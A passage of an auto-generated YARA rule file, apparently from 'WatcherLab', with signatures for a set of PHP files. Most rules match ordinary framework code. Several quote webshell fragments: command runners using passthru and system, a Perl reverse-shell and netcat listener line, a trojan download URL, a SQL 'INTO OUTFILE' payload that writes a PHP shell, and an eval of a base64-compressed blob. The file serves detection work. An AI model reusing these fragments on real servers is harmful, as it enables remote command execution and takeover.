      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x18 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $x19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $x20 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}


rule PageTypeAccess
{
   meta:
      description = "php22 - file PageTypeAccess.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "487994cfc846a5aa4317e42e1b2288c2eec01ed2ed260e975715b566ce5b136c"
   strings:
      $s1 = "namespace Concrete\\Core\\Permission\\Access;" fullword ascii
      $s2 = "class PageTypeAccess extends Access" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule OrderShippingMethodSelectionRequirementCheckerSpec
{
   meta:
      description = "php22 - file OrderShippingMethodSelectionRequirementCheckerSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "acb99b0e4067d2774b50db958d84d3dab5620c81f5d804ebfa69599861a1cec3"
   strings:
      $s1 = "$shippingMethodsResolver->getSupportedMethods($shipment)->willReturn([$firstShippingMethod, $secondShippingMethod]);" fullword ascii
      $s2 = "$shippingMethodsResolver->getSupportedMethods($shipment)->willReturn([$shippingMethod]);" fullword ascii
      $s3 = "$order->getShipments()->willReturn(new ArrayCollection([$shipment->getWrappedObject()]));" fullword ascii
      $s4 = "function it_says_that_shipping_method_have_to_be_selected_if_order_variants_require_shipping_and_channel_does_not_allow_to_s" fullword ascii
      $s5 = "function it_says_that_shipping_method_have_to_be_selected_if_order_variants_require_shipping_and_order_has_not_shipments_yet(" fullword ascii
      $s6 = "function it_says_that_shipping_method_have_to_be_selected_if_order_variants_require_shipping_and_order_has_not_shipments_yet" fullword ascii
      $s7 = "function it_says_that_shipping_method_have_to_be_selected_if_order_variants_require_shipping_and_there_is_more_than_one_ship" fullword ascii
      $s8 = "function it_says_that_shipping_method_do_not_have_to_be_selected_if_order_variants_require_shipping_but_there_is_only_one_sh" fullword ascii
      $s9 = "function it_says_that_shipping_method_do_not_have_to_be_selected_if_none_of_variants_from_order_requires_shipping(" fullword ascii
      $s10 = "use Sylius\\Component\\Core\\Checker\\OrderShippingMethodSelectionRequirementCheckerInterface;" fullword ascii
      $s11 = "use Sylius\\Component\\Shipping\\Resolver\\ShippingMethodsResolverInterface;" fullword ascii
      $s12 = "$order->getChannel()->willReturn($channel);" fullword ascii
      $s13 = "use Sylius\\Component\\Core\\Model\\ShippingMethodInterface;" fullword ascii
      $s14 = "namespace spec\\Sylius\\Component\\Core\\Checker;" fullword ascii
      $s15 = "function let(ShippingMethodsResolverInterface $shippingMethodsResolver): void" fullword ascii
      $s16 = "function it_implements_order_shipping_necessity_checker_interface(): void" fullword ascii
      $s17 = "use Sylius\\Component\\Core\\Model\\ChannelInterface;" fullword ascii
      $s18 = "use Sylius\\Component\\Core\\Model\\ShipmentInterface;" fullword ascii
      $s19 = "use Doctrine\\Common\\Collections\\ArrayCollection;" fullword ascii
      $s20 = "$this->isShippingMethodSelectionRequired($order)->shouldReturn(true);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule PhpExtensionVerifier
{
   meta:
      description = "php22 - file PhpExtensionVerifier.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53dcfa979c2463a06be74bb401df041b485a26d19823629b9211273edc3db1a1"
   strings:
      $s1 = "* (c) Hifone.com <hifone@hifone.com>" fullword ascii
      $s2 = "* @return bool TRUE when the extension is loaded, FALSE otherwise" fullword ascii
      $s3 = "* Verifies is a certain PHP extension is loaded." fullword ascii
      $s4 = "* This file is part of Hifone." fullword ascii
      $s5 = "return \"PHP Extension: '\".$this->extension.\"'\";" fullword ascii
      $s6 = "return extension_loaded($this->extension);" fullword ascii
      $s7 = "public function __construct($extension)" fullword ascii
      $s8 = "namespace Hifone\\Install\\Verify;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php22_pHpINJ
{
   meta:
      description = "php22 - file pHpINJ.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d23a1b43770016d07ab73e98350b578ab342daeb32ea9f2e49b917a7d2d81097"
   strings:
      $x1 = "echo \"After clicking go to http://www.site.com/path2phpshell/shell.php?cpc=ls to see results\";" fullword ascii
      $s2 = "<input type = \"text\" name = \"outfile\" value = \"/var/www/localhost/htdocs/n13/shell.php\" size = \"50\"> <br /> <br />" fullword ascii
      $s3 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword ascii
      $s4 = "<input type = \"text\" name = \"url\" value = \"http://www.site.com/n13/index.php\"; size = \"50\"> <br />" fullword ascii
      $s5 = "<title>|| .::News Remote PHP Shell Injection::. ||   </title>" fullword ascii
      $s6 = "$sql = \"0' UNION SELECT '0' , '<?php system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO OUTFILE '$outfile\";" fullword ascii
      $s7 = "Full server path to a writable file which will contain the Php Shell <br />" fullword ascii
      $s8 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword ascii
      $s9 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword ascii
      $s10 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword ascii
      $s11 = "Server Path to Shell: <br />" fullword ascii
      $s12 = "$path2news = $_POST['path2news'];" fullword ascii
      $s13 = "if (isset($_POST['url'])) {" fullword ascii
      $s14 = "$outfile = $_POST ['outfile'];" fullword ascii
      $s15 = "$url = $_POST['url'];" fullword ascii
      $s16 = "Url to index.php: <br /> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule PageFeedItem
{
   meta:
      description = "php22 - file PageFeedItem.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "239fd65d52fddcd26b67b24823fa6da38ad0b3a9807e0cb197bc6a04285c0fb6"
   strings:
      $s1 = "namespace Concrete\\Core\\Backup\\ContentImporter\\ValueInspector\\Item;" fullword ascii
      $s2 = "public function getContentValue()" fullword ascii
      $s3 = "public function getContentObject()" fullword ascii
      $s4 = "if ($o = $this->getContentObject()) {" fullword ascii
      $s5 = "return Feed::getByHandle($this->getReference());" fullword ascii
      $s6 = "public function getDisplayName()" fullword ascii
      $s7 = "return $o->getFeedURL();" fullword ascii
      $s8 = "public function getFieldValue()" fullword ascii
      $s9 = "return $o->getID();" fullword ascii
      $s10 = "use Concrete\\Core\\Page\\Feed;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule private_message_response_enabled
{
   meta:
      description = "php22 - file private_message_response_enabled.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "96f69be7718ce913afe9726179baabd22efcf0d483fab60ea11d9634f36d566f"
   strings:
      $s1 = "/* @var League\\URL\\URLInterface $profileURL (if users profiles are enabled) */" fullword ascii
      $s2 = "$body .= t('A message has been sent to you by %s through your profile on %s', $msgAuthor, $siteName);" fullword ascii
      $s3 = "$body .= t('To disable any future messages, change your profile preferences at: %s', $profilePreferencesURL);" fullword ascii
      $s4 = "defined('C5_EXECUTE') or die('Access Denied.');" fullword ascii
      $s5 = "$subject = t('Private message from %s', $msgAuthor);" fullword ascii
      $s6 = "$body .= t('To view your private messages, visit: %s', $myPrivateMessagesURL);" fullword ascii
      $s7 = "/* @var League\\URL\\URLInterface $replyToMessageURL (if users profiles are enabled and message sender has private messages enab" ascii
      $s8 = "/* @var League\\URL\\URLInterface $replyToMessageURL (if users profiles are enabled and message sender has private messages enab" ascii
      $s9 = "/* @var League\\URL\\URLInterface $myPrivateMessagesURL */" fullword ascii
      $s10 = "$body .= t(\"To view this user's profile, visit: %s\", $profileURL);" fullword ascii
      $s11 = "/* @var string $msgDateCreated (in system time zone) */" fullword ascii
      $s12 = "$body .= t(\"Message:\\n%s\", $msgBody);" fullword ascii
      $s13 = "/* @var League\\URL\\URLInterface $profilePreferencesURL */" fullword ascii
      $s14 = "/* @var string $msgAuthor */" fullword ascii
      $s15 = "$body .= t('Subject: %s', $msgSubject);" fullword ascii
      $s16 = "/* @var string $siteName */" fullword ascii
      $s17 = "/* @var string $msgBody */" fullword ascii
      $s18 = "/* @var string $msgSubject */" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule RadioColumn
{
   meta:
      description = "php22 - file RadioColumn.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d02b090b62ec96fbcf8b1847e0a9b5907a7586550ecda0fd8a52bf05efed76b5"
   strings:
      $x1 = "* @copyright Copyright &copy; Kartik Visweswaran, Krajee.com, 2014 - 2018" fullword ascii
      $s2 = "* @var boolean|array whether the column is hidden in export output. If set to bool `true`, it will hide the column" fullword ascii
      $s3 = "* @see http://www.w3schools.com/cssref/pr_text_white-space.asp" fullword ascii
      $s4 = "* - `prepend`: _string_, a prefix string that will be prepended before the pageSummary content" fullword ascii
      $s5 = "* - `append`: _string_, a suffix string that will be appended after the pageSummary content" fullword ascii
      $s6 = "* sense, that the column is rendered, but hidden from display. This will allow you to still export the column" fullword ascii
      $s7 = "* @author Kartik Visweswaran <kartikv2@gmail.com>" fullword ascii
      $s8 = "* @see http://www.w3schools.com/cssref/pr_dim_width.asp" fullword ascii
      $s9 = "* @var array the HTML attributes for the clear button in the header. The following special option is recognized:" fullword ascii
      $s10 = "* @var boolean whether to merge the header title row and the filter row This will not render the filter for the" fullword ascii
      $s11 = "* @var boolean whether the column is hidden from display. This is different than the `visible` property, in the" fullword ascii
      $s12 = "* following: `function ($model, $key, $index, $column)`. Where `$model`, `$key`, and `$index` refer to the" fullword ascii
      $s13 = "* To add a RadioColumn to the gridview, add it to the [[GridView::columns|columns]] configuration as follows:" fullword ascii
      $s14 = "* for all export formats. If set as an array, it will accept the list of GridView export `formats` and hide" fullword ascii
      $s15 = "* model, key and index of the row currently being rendered and `$column` is a reference to the [[RadioColumn]]" fullword ascii
      $s16 = "* @var boolean whether to show the clear button in the header to clear the radio." fullword ascii
      $s17 = "* @author    Kartik Visweswaran <kartikv2@gmail.com>" fullword ascii
      $s18 = "* RadioColumn displays a column of radio inputs in a grid view. It is different than the CheckboxColumn in the sense" fullword ascii
      $s19 = "* object. A function may be used to assign different attributes to different rows based on the data in that" fullword ascii
      $s20 = "* anonymous function ([[Closure]]) that returns such an array. The signature of the function should be the" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule PHPgetdoor_php
{
   meta:
      description = "php22 - file PHPgetdoor.php.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3c49ad220b504f5af45e03ecf43e4e7b2d11eca7ad08fe3b5b9d52a440eab048"
   strings:
      $s1 = "echo $func->invokeArgs(array($_GET[c]));" fullword ascii
      $s2 = "$func = new ReflectionFunction($_GET[m]);" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule php22_mpdf
{
   meta:
      description = "php22 - file mpdf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a4af3ce4aec470e4c5bc24c43932ca153111f1cdb0c02cfac70840cd76be6162"
   strings:
      $x1 = "if (file_exists(_MPDF_TTFONTDATAPATH.$fontkey.'.cw.dat')) $cw = file_get_contents(_MPDF_TTFONTDATAPATH.$fontkey.'.cw.dat'); " fullword ascii
      $x2 = "// These are intended as configuration variables, and should be set in config.php - which will override these values; " fullword ascii
      $x3 = "else if (file_exists(_MPDF_TTFONTDATAPATH.$font.'.cw.dat')) { $cw = @file_get_contents(_MPDF_TTFONTDATAPATH.$font.'.cw.dat'); }" fullword ascii
      $x4 = "if($p>=$start_page && $p<=$end_page) { $newarr[($p + ($target_page - $start_page))] = $this->saveHTMLHeader[$p]; }" fullword ascii
      $x5 = "if($p>=$start_page && $p<=$end_page) { $newarr[($p + ($target_page - $start_page))] = $this->OrientationChanges[$p]; }" fullword ascii
      $x6 = "if($p>=$start_page && $p<=$end_page) { $newarr[($p + ($target_page - $start_page))] = $this->saveHTMLFooter[$p]; }" fullword ascii
      $x7 = "// Expects input to be mb_encoded if necessary and RTL reversed & OTL processed" fullword ascii
      $x8 = "$file = @file_get_contents($pl['opt']['file']) or die('mPDF Error: Cannot access file attachment - '.$pl['opt']['file']);" fullword ascii
      $x9 = "if($p>=$start_page && $p<=$end_page) { $newarr[($p + ($target_page - $start_page))] = $this->pageDim[$p]; }" fullword ascii
      $x10 = "$this->PageLinks[$i][$key][4] = '@'.($p + ($target_page - $start_page));" fullword ascii
      $x11 = "if ((isset($widthcols[$i]) && $widthcols[$i] > (($temppgwidth - $tblbw) / $numcols)) && (!isset($widthcols[$i]['w']))) { " fullword ascii
      $x12 = "// If @page set non-HTML headers/footers named, they were not read until later in the HTML code - so now set them" fullword ascii
      $x13 = "// When parsing CSS need to pass temporary basepath - so links are relative to current stylesheet" fullword ascii
      $x14 = "$this->mpdfform->forms[$key]['page'] += ($target_page - $start_page);" fullword ascii
      $x15 = "$this->internallink[$key]['PAGE'] += ($target_page - $start_page);" fullword ascii
      $s16 = "else if (($this->keep_block_together) && !$this->processingHeader && !$this->processingFooter) {" fullword ascii
      $s17 = "if ($objattr['type'] == 'bookmark' ) { $this->Bookmark($objattr['CONTENT'],$objattr['bklevel'] ,$y - $this->FontSize); }" fullword ascii
      $s18 = "var $processingHeader;   //flag set when processing header - added for columns" fullword ascii
      $s19 = "// This should be overridden in config.php - but it is so important a default value is put here" fullword ascii
      $s20 = "($container_w - $l_width) - ($currblk['margin_right'] + $bdl + $pdl + $bdr + $pdr)) > (2*$this->GetCharWidth('W',false))) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule php22_pws
{
   meta:
      description = "php22 - file pws.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "96f6c5af5b955f6a3d31873adbdc675d9daa24212ba8eab5344500fee2ea5d10"
   strings:
      $s1 = "<div align=\"left\"><font size=\"1\">Uploader file :</font></div>" fullword ascii
      $s2 = "<form name=\"cmd\" method=\"POST\" enctype=\"multipart/form-data\">" fullword ascii
      $s3 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword ascii
      $s4 = "<form name=\"form1\" method=\"post\" enctype=\"multipart/form-data\">" fullword ascii
      $s5 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<?php passthru(\"pwd\"); ?>\">" fullword ascii
      $s6 = "$cmd = $_POST['cmd'];" fullword ascii
      $s7 = "if ($_POST['cmd']){" fullword ascii
      $s8 = "$uploaded = $_FILES['file']['tmp_name'];" fullword ascii
      $s9 = "<input type=\"submit\" name=\"submit2\" value=\"Upload\">" fullword ascii
      $s10 = "passthru($cmd);" fullword ascii
      $s11 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword ascii
      $s12 = "$pwddir = $_POST['dir'];" fullword ascii
      $s13 = "echo \"FILE UPLOADED TO $dez\";" fullword ascii
      $s14 = "if (file_exists($uploaded)) {" fullword ascii
      $s15 = "<input type=\"file\" name=\"file\" size=\"15\">" fullword ascii
      $s16 = "$real = $_FILES['file']['name'];" fullword ascii
      $s17 = "copy($uploaded, $dez);" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 2KB and
      8 of them
}

rule php22_preview
{
   meta:
      description = "php22 - file preview.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "23b3fa4f700dee8a6a97a5559cb033f9ce98f14c6c92f3af080fd7f3a2b9086c"
   strings:
      $s1 = "$c = Page::getByID(Loader::helper('security')->sanitizeInt($_REQUEST['cID']));" fullword ascii
      $s2 = "defined('C5_EXECUTE') or die(\"Access Denied.\");" fullword ascii
      $s3 = "<iframe id=\"ccm-page-preview-frame\" name=\"ccm-page-preview-frame\"></iframe>" fullword ascii
      $s4 = "if (is_object($c) && !$c->isError()) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_priv95
{
   meta:
      description = "php22 - file priv95.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9370fd7ec40fe553b0ee1bb6d943f2a8a8df34c4de63f67bdee2544b84e2062e"
   strings:
      $s1 = "$lktd = \"eNrsvGmT40iSKPZ5xmz/Q6mszaZH2B0AxEHgrVpPuG+CAEFca2ttuG+AIIhTtv9dIDMrs6q6R+/JpI9iT5FAhN/h7uEekTb/23+/5bd/+ev/MSSP35sgK6" ascii
      $s2 = "zemRXxk4H39FjXeBQ1eAhruNW5krNWq15W2vms91qsxFiXuezXexetxvddrbRKRXb3hz7E6uvc3b7CXNhgDJ6iA0k1RCcR7ZTK5zJ49YK9WmBM7k+ZwiMI2jejpVEw+R" ascii
      $s3 = "eval(\"?>\".gzuncompress(base64_decode($lktd)));" fullword ascii
      $s4 = "// Set Username & Password" fullword ascii
      $s5 = "IXpDljHBrxKa4IzxOYgTiJEYE3qnQqRuBWcYiPUdAkEd4NAslvVopVzzPFb9o9C+E6ylqJMdaBLkzoy7VF9poFvrFN61xky3TMTHlpGZPqQGkI06tF0nhXyKIdChkv44" ascii
      $s6 = "QMsQLntKPdGdedlhf+wxpUruK/O7YCxBPG0hppdArkXslhTu0CyArSnpZ81kdiWpLklGJAYWWSlW7jmhZ6rkPtWPZvEaMCDQYMh2/t4jBIlMKxu85WDflaFO2pIQDkyA" ascii
      $s7 = "31U7Z0+ghV4HmsXE5xBl2gPZ2lxzPwJZVQ4bi9RT4HJb2TTwfe/LhqO3NJO3hCNwvWjUTuOAyCM4OJd73lekLfJcJ2pQGdlfDLLrEHZPuzRJyIXikJY/4SWHmplotFeM" ascii
      $s8 = "Ek87naD2vAog3ALf/8BwAuaSyLqnsMqmF3FclccDU0HpviaK0meKxS/F4iWJbGFkSpy/ROtpMK+3SSi/RykmopoyhCQORk5Yo9jdTTLoUk0sUC+4GqY8av5la3KUWX6K" ascii
      $s9 = "hMLUrQ9BywlUrqniW2tSYsSXsUt6x26ZK1rhv+2qy8oy6ZeyeNKkigg4UFglpCyNiD2RgVnIxuncQMzepfCOIkdLO0E08e8XDuV/7dngII95RBarcR6vGlzPqrhA0bUQ" ascii
      $s10 = "rjrNZOE5CtpsJqi9U+RdMydnb1GB3fBHR1vakyyAHimBb+MRAbmNS2yEXirctK8p+mcEkjLaEA3fCGQ1W7jTez5c3Wq4h7supFRD0mypelPs15cf/PUZHcST+pWgrczY" ascii
      $s11 = "Dn0n4eYEmBpDTD5qL4UdpRVkP8KqhteW7DWPNgX739WcBCuR1HlZ6GG1JyG+oOIDHOQhJBUnAcPvLxbMcSyzArrAgiGFs6DWCR3/stYlhPKbNexFNsVqw8m7hnpTNGVb" ascii
      $s12 = "/A+30T7bJW/jO/JSQvIXy8bspY6T1Bson76bM8bKoYMqrBFO/QG2dovu52eNxJKl9TlolJyqwXlN/dr6O8P1VmpmfYVGBpcMKqff3sjx5XN8R8uQIlAQnCT+NTjZ2Suw" ascii
      $s13 = "57tWee94c+FxqNrpMvllrts/YdrHAnhO/3zQP45gWhCP0UQAzGQ6w50sPYOplSDQPIHoe8DX4j42na66ZCzY6WDpgo3PfT9m4yJxioQ5d/PEzJhAFlama4KUSk/hZ4wv" ascii
      $s14 = "8l2rNozwRfpkKzc5hFcdMt5zHujHFM+tx7zb3qJ9vwEX+Bo4YNt1CKeE05Y49xPgsCP0BE0C40fE65hXpKucc0/q9OoQLkihM1vsYXWmhMa6Rne0hNb+BftpNwPXaZvf" ascii
      $s15 = "19A5tw5HeAdWTlQjqRld3bAcXjFa6nFejBmpjMmNNgwbehnwSQc0Cbiw2sKiiSY/BdDKTTR/v5oonZ6XZEIoDrUHx6du2BYdFsZrZiZ8d5y/juCrdsYgDMERaiA4MzPB" ascii
      $s16 = "yvfvTBbvbXnl+xgvn3dllqZteunq6vNwr5Xo7t4XM1fGlcWI599vrR83mXbabX70aLBbK5km/3uhVndbOzqpZKff37nNnBfNgN55z1hfrVdz/i0pPT54X00bxoeAkWrm" ascii
      $s17 = "//=====+++Digital Communist Guerrillas+++=====//" fullword ascii
      $s18 = "3swpX8mWD9YPV/R3JTl3eXSCb8/yMLyCOh7vHU1+AyJLvLdBLkoStvGhJKyVxx8qSo/hahK7u6Mc2aT0spyffoxnd+g10EJbfYbo/WzOJ9uDZUOGKsQaxvKx5gdm67IH" ascii
      $s19 = "TDP6mC6c/fFRMLNxkBfzRfD5A7EYrdJHJAbcm+zXmACE7CZ6EEijjFbnrsWwZQuUiWvCWFGetZRUjQKIkPdl7fN+z9URtwei19qLWSOXXXNdupXqTo35bPI5t+w/rYif" ascii
      $s20 = "3KK7QDcHWCx8VHBOQwzVR7rDYwrYxqoDpxX3mHkUSAMn1dl/8ihgQ0EOyk9VtnIgJWbjpiUUBRUkaV2PcEIIsupA58HtdcCBzou3puDny2HkWeiQC6ytBS1xURcTeTWq" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}


rule ProductAttributeValueRepository
{
   meta:
      description = "php22 - file ProductAttributeValueRepository.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9f28a61fe6ae4a674fad9a33e307a473bd812b0616f1e6c7ae00d69b45b9cfde"
   strings:
      $s1 = "use Sylius\\Component\\Product\\Repository\\ProductAttributeValueRepositoryInterface;" fullword ascii
      $s2 = "public function findByJsonChoiceKey(string $choiceKey): array" fullword ascii
      $s3 = "class ProductAttributeValueRepository extends EntityRepository implements ProductAttributeValueRepositoryInterface" fullword ascii
      $s4 = "->setParameter('key', '%\"' . $choiceKey . '\"%')" fullword ascii
      $s5 = "use Sylius\\Bundle\\ResourceBundle\\Doctrine\\ORM\\EntityRepository;" fullword ascii
      $s6 = "namespace Sylius\\Bundle\\ProductBundle\\Doctrine\\ORM;" fullword ascii
      $s7 = "->andWhere('o.json LIKE :key')" fullword ascii
      $s8 = "->getResult()" fullword ascii
      $s9 = "->getQuery()" fullword ascii
      $s10 = "return $this->createQueryBuilder('o')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule recoveryModal
{
   meta:
      description = "php22 - file recoveryModal.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "042568cef1827e253c64dd844c5a540868bc195feb1d49abe0faad6cfbc4a4b6"
   strings:
      $s1 = "<button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\"><?php _e('Cancel', 'Ip-admin') ?></button>" fullword ascii
      $s2 = "<button type=\"button\" class=\"ipsRecovery btn btn-primary\"><?php _e('Recovery', 'Ip-admin') ?></button>" fullword ascii
      $s3 = "<h4 class=\"modal-title\"><?php _e('Recovery pages', 'Ip-admin') ?></h4>" fullword ascii
      $s4 = "<div class=\"modal-dialog\">" fullword ascii
      $s5 = "<div class=\"modal-content\">" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 2KB and
      all of them
}

rule RedisPersistent
{
   meta:
      description = "php22 - file RedisPersistent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3eb8f97ee5e8f653f387324a84662d29d65f7226fbba3bd2f5475dc0d1b18e7e"
   strings:
      $s1 = "* @method set($key, $value)" fullword ascii
      $s2 = "<coder.liu@qq.com>" fullword ascii
      $s3 = "* redis" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule report_helper
{
   meta:
      description = "php22 - file report_helper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "25a17b7805b61e5d608f6fd768bce2d88b16ba366af1fe66f3d536014d456bf3"
   strings:
      $s1 = "function show_report_if_allowed($report_prefix, $report_name, $person_id, $permission_id = '')" fullword ascii
      $s2 = "$permission_id = empty($permission_id) ? 'reports_' . $report_name : $permission_id;" fullword ascii
      $s3 = "if($CI->Employee->has_grant($permission_id, $person_id))" fullword ascii
      $s4 = "<?php if (!defined('BASEPATH')) exit('No direct script access allowed');" fullword ascii
      $s5 = "function show_report($report_prefix, $report_name, $lang_key='')" fullword ascii
      $s6 = "if(!empty($report_label) && $report_label != $lang_key . ' (TBD)')" fullword ascii
      $s7 = "$report_prefix = empty($report_prefix) ? '' : $report_prefix . '_';" fullword ascii
      $s8 = "$lang_key = empty($lang_key) ? $report_name : $lang_key;" fullword ascii
      $s9 = "show_report($report_prefix, $report_name, $permission_id);" fullword ascii
      $s10 = "// no summary nor detailed reports for receivings" fullword ascii
      $s11 = "$report_label = $CI->lang->line($lang_key);" fullword ascii
      $s12 = "name));?>\"><?php echo $report_label; ?></a>" fullword ascii
      $s13 = "$CI =& get_instance();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule persistable
{
   meta:
      description = "php22 - file persistable.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1291806abea47d730a3e3b958cf5de9bf0cb243816a46ecd51a6a9f82ed75caa"
   strings:
      $x1 = "* @link       http://www.GetAnahita.com" fullword ascii
      $s2 = "* @author     Rastin Mehr <rastin@anahitapolis.com>" fullword ascii
      $s3 = "* @author     Arash Sanieyan <ash@anahitapolis.com>" fullword ascii
      $s4 = "* This functions merges the request information with any model state information" fullword ascii
      $s5 = "* @license    GNU GPLv3 <http://www.gnu.org/licenses/gpl-3.0.html>" fullword ascii
      $s6 = "* that was saved in the session and returns the result." fullword ascii
      $s7 = "protected function _beforeControllerBrowse(KCommandContext $context)" fullword ascii
      $s8 = "protected function _afterControllerBrowse(KCommandContext $context)" fullword ascii
      $s9 = "$identifier = $this->_mixer->getIdentifier().'.'.$action;" fullword ascii
      $s10 = "$state = KRequest::get('session.'.$identifier, 'raw', array());" fullword ascii
      $s11 = "* Saves the model state in the session." fullword ascii
      $s12 = "KRequest::set('session.'.$identifier, KConfig::unbox($state));" fullword ascii
      $s13 = "* Load the model state from the request." fullword ascii
      $s14 = "* Restores a state for an action." fullword ascii
      $s15 = "The active command context" fullword ascii
      $s16 = "* Persistable Behavior." fullword ascii
      $s17 = "$this->getState()->append($state);" fullword ascii
      $s18 = "// Built the session identifier based on the action" fullword ascii
      $s19 = "KCommandContext" fullword ascii
      $s20 = "//Built the session identifier based on the action" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule PostgresBuilder
{
   meta:
      description = "php22 - file PostgresBuilder.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7b42f7db54d6a31ba1884f714a4c2ae676c57b8ce73e7ed0b9e119688b724cf1"
   strings:
      $s1 = "return $this->connection->getPostProcessor()->processColumnListing($results);" fullword ascii
      $s2 = "$this->grammar->compileGetAllTables($this->connection->getConfig('schema'))" fullword ascii
      $s3 = "if (is_array($schema = $this->connection->getConfig('schema'))) {" fullword ascii
      $s4 = "* Get the column listing for a given table." fullword ascii
      $s5 = "* Get all of the table names for the database." fullword ascii
      $s6 = "* Parse the table name and extract the schema and table." fullword ascii
      $s7 = "$table = $this->connection->getTablePrefix().$table;" fullword ascii
      $s8 = "* Drop all tables from the database." fullword ascii
      $s9 = "* Determine if the given table exists." fullword ascii
      $s10 = "* @param  string  $table" fullword ascii
      $s11 = "foreach ($this->getAllTables() as $row) {" fullword ascii
      $s12 = "$this->grammar->compileDropAllTables($tables)" fullword ascii
      $s13 = "$this->grammar->compileColumnListing(), [$schema, $table]" fullword ascii
      $s14 = "public function getColumnListing($table)" fullword ascii
      $s15 = "$this->grammar->compileTableExists(), [$schema, $table]" fullword ascii
      $s16 = "protected function getAllTables()" fullword ascii
      $s17 = "$schema = head($schema);" fullword ascii
      $s18 = "return $this->connection->select(" fullword ascii
      $s19 = "return count($this->connection->select(" fullword ascii
      $s20 = "list($schema, $table) = $this->parseSchemaAndTable($table);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule php22_Random
{
   meta:
      description = "php22 - file Random.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "712e02fcda70aa3c547f4977d0c7250ea6817d7c72636504e533027bf20ca6f9"
   strings:
